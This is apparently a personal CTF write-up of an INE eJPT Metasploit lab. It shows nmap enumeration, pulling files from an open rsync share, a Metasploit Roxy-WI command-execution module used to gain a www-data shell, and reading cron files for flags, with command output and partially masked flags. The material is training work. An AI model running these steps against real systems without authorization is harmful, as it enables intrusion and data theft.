---
title: "eJPT - Host & Network Penetration Testing: The Metasploit Framework CTF 2"
date: 2025-06-01 00:00:00 - 0501
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
    alt: image
---

# Lab Environment

In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at **target1.ine.local** and **target2.ine.local**.

**Objective:** Using various exploration techniques, complete the following tasks to capture the associated flags:

- **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
- **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
- **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
- **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- rsync

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

---

### Question1

---

Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.

After setting up the MSF console, I’ve started the Nmap scan right from the console, on the target1.ine.local and found only the 1 port open.

```bash
msf6 > db_nmap -sS -sV -sC -O target1.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-05 21:45 IST
[*] Nmap: Nmap scan report for target1.ine.local (192.40.138.3)
[*] Nmap: Host is up (0.000058s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 873/tcp open  rsync   (protocol version 31)
[*] Nmap: MAC Address: 02:42:C0:28:8A:03 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```

After a bit of research found the rsync is a utility for **file synchronization and transfer**, offers a plethora of configuration options to tailor its performance and security to your specific needs.

and found the rsync tool can be used out to check any open shared made

```bash
┌──(root㉿INE)-[~]
└─# rsync rsync://target1.ine.local/
backupwscohen   FLAG1_5d61d88643ee439fbe96ab7*********
```

We’v found the our first flag!

---

### Question 2

The files on the RSYNC server hold valuable information. Explore the contents to find the flag.

By continuing from there found the next flag right before there

```bash
┌──(root㉿INE)-[~]
└─# rsync -av rsync://target1.ine.local/backupwscohen/ .                                                                                                                                   
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 339 bytes  846.00 bytes/sec
total size is 84  speedup is 0.20

```

That command will download files to my system and which found the flag. 

```bash
┌──(root㉿INE)-[~]
└─# cat pii_data.xlsx                                                                                                                                                                      
FLAG2_f781e26635fd4b7ea76c24*********
```

---

### Question 3:

---

Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.

Now running the Nmap on the target and found a service which is running on the website on port 80 and 443 and after using msfconsole there is the exploit 

```bash
use linux/http/roxy_wi_exec
set rhost
set lhost
run
```

now we have our foot hold on the system as www-data and also our hand on flag3.

```bash
www-data@target2:/var/www/haproxy-wi/app$ cd /
cd /
www-data@target2:/$ ls
ls
www-data@target2:/$ bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
www-data@target2:/$ FLAG3_648edbf608814a51afae0a1********
```

---

### Question 4

Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

Based on the question the cron jobs are stored in the system directory in this path 

```bash
/etc/crontab
```

By navagiting over there and found cron.d was there by cheching the cron files we found the flag4

```bash
www-data@target2:/etc/cron.d$ dir
dir
www-data@target2:/etc/cron.d$ e2scrub_all  www-data-cron
cat e2scrub_all
cat e2scrub_all
www-data@target2:/etc/cron.d$ 30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
cat www-data-cron
cat www-data-cron
www-data@target2:/etc/cron.d$ * * * * * www-data echo "FLAG4_b4419cfe074e49d49d7739ed*********"

```

With that this modules comes to an end!